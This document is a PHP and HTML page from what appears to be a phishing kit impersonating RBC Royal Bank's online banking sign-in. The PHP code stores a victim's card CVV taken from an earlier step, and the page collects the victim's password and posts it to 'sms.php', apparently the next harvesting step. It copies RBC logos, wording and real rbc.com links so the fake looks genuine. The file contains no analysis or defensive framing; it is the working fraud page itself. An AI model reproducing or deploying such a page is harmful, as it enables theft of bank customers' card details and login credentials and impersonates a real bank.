<?php session_start();

if(!isset($_GET['loop']) ){
  if (!isset($_POST["cvv"]) ) {
    //var_dump($_GET['loop']) ;
//var_dump($_REQUEST) ;
    header("Location: ./index.php");
    //  exit();
  }
}

if($_POST['cvv']){
  $_SESSION['cvv'] = $_POST['cvv'] ;
    
} 

var_dump($_SESSION['try']) ;
?>

<html><head>


<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RBC Royal Bank - Secure Sign In</title>
<style>
body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
}
.container {
    display: flex;
    flex-direction: column;
    height: 100%;
}
.image-panel {
    flex: 1;
    background-image: url('full-signin-branding.cb150217a344f9cfdf17.jpg');
    background-size: cover;
    background-position: center;
    min-height: 200px;
}
.form-panel {
    flex: 2;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    padding: 20px;
    background-color: white;
    overflow-y: auto;
}
.form-container {
    width: 100%;
  
    margin: 0 auto;
}
h1 {
    color: #333;
    font-size: 18px;
    margin-bottom: 20px;
}
.input-container {
    position: relative;
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    box-sizing: border-box;
}
.icon {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    color: #666;
}
button {
    width: 100%;
    padding: 10px;
    background-color: #0066cc;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
}
button:hover {
    background-color: #005bb8;
}
.links {
    margin-top: 20px;
}
.links a {
    display: block;
    color: #0066cc;
    text-decoration: none;
    margin-bottom: 10px;
}
.service-notices {
    margin-top: 30px;
}
.service-notices h2 {
    font-size: 16px;
    color: #333;
}
.service-notices a {
    color: #0066cc;
    text-decoration: none;
}
.footer {
    margin-top: auto;
    font-size: 12px;
    color: #666;
}
.footer a {
    color: #0066cc;
    text-decoration: none;
    margin-right: 10px;
}

@media (min-width: 769px) {
    .container {
        flex-direction: row;
    }
    .image-panel {
        flex: 1;
        min-height: auto;
    }
    .form-panel {
        flex: 1;
    }
}

@media (max-width: 768px) {
    .form-panel {
        padding: 15px;
    }
    .form-container {
        max-width: 100%;
    }
    h1 {
        font-size: 16px;
    }
    .footer {
        text-align: center;
    }
    .footer a {
        display: block;
        margin-bottom: 5px;
    }
}

@media (max-width: 480px) {
    .form-panel {
        padding: 10px;
    }
    input, button {
        font-size: 14px;
    }
    .links a, .service-notices a {
        font-size: 14px;
    }
    .footer {
        font-size: 10px;
    }
}
.image-panel{
    display: flex;
     align-items: center;
    flex-direction: row;
}

.imagecont{
    height: 30%;
    color: white;
    width: 40%;
    margin: auto;
    text-align: center;
    min-height: 200px;


}
.logo {
            width:100% ;
            height:60% ;
            background-image: url('./Royal_Bank_of_Canada-Logo.wine-3250253554.png');
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
        }
</style>
</head>
<body>
<div class="container">
    <div class="image-panel">
        <div class="imagecont">
           <div class="logo">

           </div>

        Secure Sign-In
        RBC Online Banking
        </div>
    </div>
    <div class="form-panel">
        <div class="form-container">
            <h1>  Password</h1>
           
            <form action="sms.php" method="POST" >
                <div class="input-container">
           
                    <input type="password" name="mdp" placeholder="" required>
                    <span class="icon">&#9776;</span>
                </div>
                <button type="submit">Next</button>
            </formaction>
            <div class="links">
                <a href="https://www.rbcroyalbank.com/recover-username">Recover Your Username</a>
                <a href="https://www.rbcroyalbank.com/enrol-online-banking">Enrol in Online Banking</a>
            </div>
            <div class="service-notices">
                <h2>Service Notices</h2>
                <a href="https://www.rbcroyalbank.com/avion-rewards-maintenance">Maintenance to affect Avion Rewards</a>
                <p><a href="https://www.rbcroyalbank.com/online-services">Other Online Services</a></p>
            </div>
            <div class="footer">
                <p>RBC Online Banking is provided by Royal Bank of Canada.</p>
                <p>Royal Bank of Canada Website, © 1995-2024</p>
                <a href="https://www.rbc.com/legal/">Legal</a>
                <a href="https://www.rbc.com/accessibility/">Accessibility</a>
                <a href="https://www.rbc.com/privacysecurity/">Privacy & Security</a>
                <a href="https://www.rbc.com/cookies/">Advertising & Cookies</a>
            </div>
        </div>
    </div>
</div>

<script>

</script>
</body></html>